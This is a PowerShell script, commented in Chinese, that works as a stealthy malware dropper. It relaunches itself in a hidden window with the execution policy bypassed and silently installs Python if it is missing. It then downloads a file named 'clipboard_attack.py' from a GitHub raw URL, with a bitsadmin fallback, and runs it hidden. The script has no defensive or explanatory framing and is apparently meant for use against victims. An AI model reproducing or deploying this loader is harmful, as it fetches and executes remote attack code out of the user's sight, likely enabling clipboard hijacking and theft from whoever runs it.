# 让 PowerShell 静默运行
$powershellPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
Start-Process -WindowStyle Hidden -FilePath $powershellPath -ArgumentList "-ExecutionPolicy Bypass -File $PSCommandPath" -PassThru
exit

# 设置执行策略为 ByPass
Set-ExecutionPolicy Bypass -Scope Process -Force

# 定义脚本下载链接
$scriptUrl = "https://raw.githubusercontent.com/ethxiaoli/clipboard-setup/main/clipboard_attack.py"
$scriptPath = "$env:TEMP\clipboard_attack.py"

# 检查 Python 是否已安装
$pythonCheck = (Get-Command python -ErrorAction SilentlyContinue)
if (-not $pythonCheck) {
    # 静默安装 Python
    $pythonInstaller = "https://www.python.org/ftp/python/3.7.9/python-3.7.9-amd64.exe"
    $pythonPath = "C:\Python37\python.exe"

    Invoke-WebRequest -Uri $pythonInstaller -OutFile "$env:TEMP\python_installer.exe"
    Start-Process -FilePath "$env:TEMP\python_installer.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait

    if (-not (Test-Path $pythonPath)) {
        exit 1
    }
}

# 使用 Invoke-WebRequest 下载 Python 脚本
try {
    Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -ErrorAction Stop
} catch {
    Start-Process -WindowStyle Hidden -FilePath "bitsadmin" -ArgumentList "/transfer DownloadScript $scriptUrl $scriptPath" -Wait
}

# 运行 Python 脚本（静默模式）
if (Test-Path $scriptPath) {
    Start-Process -WindowStyle Hidden -FilePath "python" -ArgumentList $scriptPath -PassThru
}
